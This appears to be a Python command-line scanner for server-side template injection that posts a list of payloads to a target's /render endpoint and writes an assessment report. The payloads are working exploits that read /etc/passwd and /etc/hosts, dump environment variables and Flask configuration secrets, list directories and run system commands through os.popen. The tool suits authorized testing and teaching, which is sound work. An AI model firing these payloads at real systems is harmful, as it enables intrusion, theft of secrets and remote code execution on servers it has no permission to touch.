#!/usr/bin/env python3

import sys
import time
import logging
import argparse
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import requests
from urllib.parse import urljoin
from requests.exceptions import RequestException, ConnectionError, Timeout


class VulnerabilityLevel(Enum):
    """Enumeration for vulnerability severity levels."""
    LOW = "LOW"
    MEDIUM = "MEDIUM"
    HIGH = "HIGH"
    CRITICAL = "CRITICAL"


@dataclass
class PayloadResult:
    """Data class representing the result of a payload execution."""
    payload: str
    success: bool
    response_text: str
    vulnerability_level: VulnerabilityLevel
    description: str
    execution_time: float


class SSTemplateInjectionScanner:
    """
    Server-Side Template Injection vulnerability scanner.
    
    This class provides methods to test various SSTI payloads against
    a target application and assess the security implications.
    """
    
    def __init__(self, target_url: str, timeout: int = 10, max_retries: int = 3):
        """
        Initialize the SSTI scanner.
        
        Args:
            target_url: The base URL of the target application
            timeout: Request timeout in seconds
            max_retries: Maximum number of retry attempts
        """
        self.target_url = target_url.rstrip('/')
        self.render_endpoint = urljoin(self.target_url + '/', 'render')
        self.timeout = timeout
        self.max_retries = max_retries
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SSTI-Scanner/1.0.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        
        self._configure_logging()
    
    def _configure_logging(self) -> None:
        """Configure logging for the scanner."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.StreamHandler(sys.stdout),
                logging.FileHandler('ssti_scan.log')
            ]
        )
        self.logger = logging.getLogger(self.__class__.__name__)
    
    @property
    def payloads(self) -> Dict[str, Tuple[str, VulnerabilityLevel, str]]:
        """
        Return a dictionary of SSTI payloads with their metadata.
        
        Returns:
            Dictionary mapping payload names to (payload, level, description) tuples
        """
        return {
            'arithmetic_basic': (
                '{{ 7*7 }}',
                VulnerabilityLevel.LOW,
                'Basic arithmetic evaluation test'
            ),
            'arithmetic_advanced': (
                '{{ ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__["sys"].exit }}',
                VulnerabilityLevel.HIGH,
                'Advanced object traversal for system access'
            ),
            'file_read_passwd': (
                "{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}",
                VulnerabilityLevel.CRITICAL,
                'Critical file disclosure vulnerability - /etc/passwd access'
            ),
            'file_read_hosts': (
                "{{ self.__init__.__globals__.__builtins__.open('/etc/hosts').read() }}",
                VulnerabilityLevel.HIGH,
                'System file disclosure - /etc/hosts access'
            ),
            'environment_disclosure': (
                "{{ self.__init__.__globals__.__builtins__.__import__('os').environ }}",
                VulnerabilityLevel.HIGH,
                'Environment variables disclosure'
            ),
            'command_execution': (
                "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
                VulnerabilityLevel.CRITICAL,
                'Remote code execution via system commands'
            ),
            'python_version': (
                "{{ self.__init__.__globals__.__builtins__.__import__('sys').version }}",
                VulnerabilityLevel.MEDIUM,
                'System information disclosure - Python version'
            ),
            'current_working_directory': (
                "{{ self.__init__.__globals__.__builtins__.__import__('os').getcwd() }}",
                VulnerabilityLevel.MEDIUM,
                'Directory traversal - current working directory disclosure'
            ),
            'list_directory': (
                "{{ self.__init__.__globals__.__builtins__.__import__('os').listdir('.') }}",
                VulnerabilityLevel.HIGH,
                'Directory listing vulnerability'
            ),
            'flask_config_disclosure': (
                "{{ config }}",
                VulnerabilityLevel.HIGH,
                'Flask application configuration disclosure'
            )
        }
    
    def _execute_request(self, payload: str) -> Optional[str]:
        """
        Execute a single HTTP request with the given payload.
        
        Args:
            payload: The SSTI payload to test
            
        Returns:
            Response text or None if request failed
        """
        for attempt in range(self.max_retries):
            try:
                response = self.session.post(
                    self.render_endpoint,
                    data={'input': payload},
                    timeout=self.timeout,
                    allow_redirects=False
                )
                response.raise_for_status()
                return response.text
                
            except (ConnectionError, Timeout) as e:
                self.logger.warning(
                    f"Connection attempt {attempt + 1} failed for payload: {payload[:50]}... - {e}"
                )
                if attempt < self.max_retries - 1:
                    time.sleep(2 ** attempt)  # Exponential backoff
                    
            except RequestException as e:
                self.logger.error(f"Request failed for payload: {payload[:50]}... - {e}")
                break
        
        return None
    
    def _analyze_response(self, payload: str, response_text: str, 
                         expected_level: VulnerabilityLevel, description: str) -> bool:
        """
        Analyze the response to determine if the payload was successful.
        
        Args:
            payload: The tested payload
            response_text: The HTTP response text
            expected_level: Expected vulnerability level
            description: Payload description
            
        Returns:
            True if the payload appears to have executed successfully
        """
        # Check for common indicators of successful SSTI exploitation
        success_indicators = [
            # Basic arithmetic
            '49' if '7*7' in payload else None,
            # File content indicators
            'root:' if '/etc/passwd' in payload else None,
            'localhost' if '/etc/hosts' in payload else None,
            # System information
            'Python' if 'sys.version' in payload else None,
            # Environment variables
            'PATH=' if 'environ' in payload else None,
            # Command execution
            'uid=' if "popen('id')" in payload else None,
            # Directory operations
            '/' if 'getcwd()' in payload else None,
            # Flask config
            'SECRET_KEY' if 'config' in payload else None
        ]
        
        # Remove None values and check for matches
        success_indicators = [indicator for indicator in success_indicators if indicator]
        
        # Check if response contains expected content
        if success_indicators:
            for indicator in success_indicators:
                if indicator in response_text:
                    return True
        
        # Check for error patterns that might indicate attempted execution
        error_patterns = [
            "FileNotFoundError",
            "PermissionError", 
            "AttributeError",
            "ImportError",
            "NameError"
        ]
        
        # If we see errors, it might indicate the template engine processed our payload
        return any(error in response_text for error in error_patterns)
    
    def test_payload(self, payload_name: str) -> PayloadResult:
        """
        Test a single payload and return the result.
        
        Args:
            payload_name: Name of the payload to test
            
        Returns:
            PayloadResult object containing test results
        """
        if payload_name not in self.payloads:
            raise ValueError(f"Unknown payload: {payload_name}")
        
        payload, level, description = self.payloads[payload_name]
        
        self.logger.info(f"Testing payload: {payload_name}")
        
        start_time = time.time()
        response_text = self._execute_request(payload)
        execution_time = time.time() - start_time
        
        if response_text is None:
            return PayloadResult(
                payload=payload,
                success=False,
                response_text="",
                vulnerability_level=level,
                description=description,
                execution_time=execution_time
            )
        
        success = self._analyze_response(payload, response_text, level, description)
        
        return PayloadResult(
            payload=payload,
            success=success,
            response_text=response_text,
            vulnerability_level=level,
            description=description,
            execution_time=execution_time
        )
    
    def run_comprehensive_scan(self) -> List[PayloadResult]:
        """
        Execute a comprehensive scan using all available payloads.
        
        Returns:
            List of PayloadResult objects
        """
        self.logger.info(f"Starting comprehensive SSTI scan against: {self.target_url}")
        
        results = []
        total_payloads = len(self.payloads)
        
        for i, payload_name in enumerate(self.payloads.keys(), 1):
            self.logger.info(f"Progress: {i}/{total_payloads} - Testing {payload_name}")
            
            try:
                result = self.test_payload(payload_name)
                results.append(result)
                
                # Add delay between requests to be respectful to the target
                time.sleep(0.5)
                
            except Exception as e:
                self.logger.error(f"Error testing payload {payload_name}: {e}")
                continue
        
        self.logger.info("Comprehensive scan completed")
        return results
    
    def generate_report(self, results: List[PayloadResult]) -> str:
        """
        Generate a detailed security assessment report.
        
        Args:
            results: List of PayloadResult objects
            
        Returns:
            Formatted report string
        """
        successful_results = [r for r in results if r.success]
        critical_vulns = [r for r in successful_results if r.vulnerability_level == VulnerabilityLevel.CRITICAL]
        high_vulns = [r for r in successful_results if r.vulnerability_level == VulnerabilityLevel.HIGH]
        
        report_lines = [
            "="*80,
            "SERVER-SIDE TEMPLATE INJECTION VULNERABILITY ASSESSMENT REPORT",
            "="*80,
            "",
            f"Target: {self.target_url}",
            f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}",
            f"Total Payloads Tested: {len(results)}",
            f"Successful Exploits: {len(successful_results)}",
            "",
            "EXECUTIVE SUMMARY:",
            f"- Critical Vulnerabilities: {len(critical_vulns)}",
            f"- High Risk Vulnerabilities: {len(high_vulns)}",
            "",
            "DETAILED FINDINGS:",
            "-" * 50
        ]
        
        for result in results:
            status = "SUCCESS" if result.success else "FAILED"
            report_lines.extend([
                f"\nPayload: {result.payload[:100]}{'...' if len(result.payload) > 100 else ''}",
                f"Status: {status}",
                f"Severity: {result.vulnerability_level.value}",
                f"Description: {result.description}",
                f"Execution Time: {result.execution_time:.3f}s"
            ])
            
            if result.success and result.response_text:
                # Truncate response for readability
                response_preview = result.response_text[:200]
                if len(result.response_text) > 200:
                    response_preview += "..."
                report_lines.append(f"Response Preview: {response_preview}")
        
        report_lines.extend([
            "",
            "="*80,
            "RECOMMENDATIONS:",
            "- Implement proper input validation and sanitization",
            "- Use safe template rendering methods",
            "- Apply the principle of least privilege",
            "- Consider using sandboxed template engines",
            "- Regular security assessments and code reviews",
            "="*80
        ])
        
        return "\n".join(report_lines)


def create_argument_parser() -> argparse.ArgumentParser:
    """Create and configure the argument parser."""
    parser = argparse.ArgumentParser(
        description="Professional Server-Side Template Injection Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    %(prog)s http://localhost:5000
    %(prog)s http://localhost:5000 --payload file_read_passwd
    %(prog)s http://localhost:5000 --timeout 15 --output report.txt
        """
    )
    
    parser.add_argument(
        'target_url',
        help='Target application URL (e.g., http://localhost:5000)'
    )
    
    parser.add_argument(
        '--payload',
        help='Test only a specific payload by name',
        choices=SSTemplateInjectionScanner('dummy').payloads.keys()
    )
    
    parser.add_argument(
        '--timeout',
        type=int,
        default=10,
        help='Request timeout in seconds (default: 10)'
    )
    
    parser.add_argument(
        '--output',
        help='Output file for the report (default: stdout)'
    )
    
    parser.add_argument(
        '--list-payloads',
        action='store_true',
        help='List all available payloads and exit'
    )
    
    return parser


def main() -> int:
    """Main entry point for the application."""
    parser = create_argument_parser()
    args = parser.parse_args()
    
    # Handle --list-payloads option
    if args.list_payloads:
        scanner = SSTemplateInjectionScanner('dummy')
        print("Available payloads:")
        print("-" * 40)
        for name, (payload, level, description) in scanner.payloads.items():
            print(f"Name: {name}")
            print(f"Severity: {level.value}")
            print(f"Description: {description}")
            print(f"Payload: {payload}")
            print("-" * 40)
        return 0
    
    # Initialize scanner
    try:
        scanner = SSTemplateInjectionScanner(
            target_url=args.target_url,
            timeout=args.timeout
        )
    except Exception as e:
        print(f"Error initializing scanner: {e}", file=sys.stderr)
        return 1
    
    # Execute scan
    try:
        if args.payload:
            # Test single payload
            result = scanner.test_payload(args.payload)
            results = [result]
        else:
            # Run comprehensive scan
            results = scanner.run_comprehensive_scan()
        
        # Generate and output report
        report = scanner.generate_report(results)
        
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write(report)
            print(f"Report saved to: {args.output}")
        else:
            print(report)
        
        # Return appropriate exit code
        successful_exploits = sum(1 for r in results if r.success)
        return 0 if successful_exploits > 0 else 1
        
    except KeyboardInterrupt:
        print("\nScan interrupted by user", file=sys.stderr)
        return 130
    except Exception as e:
        print(f"Error during scan: {e}", file=sys.stderr)
        return 1


if __name__ == '__main__':
    sys.exit(main())
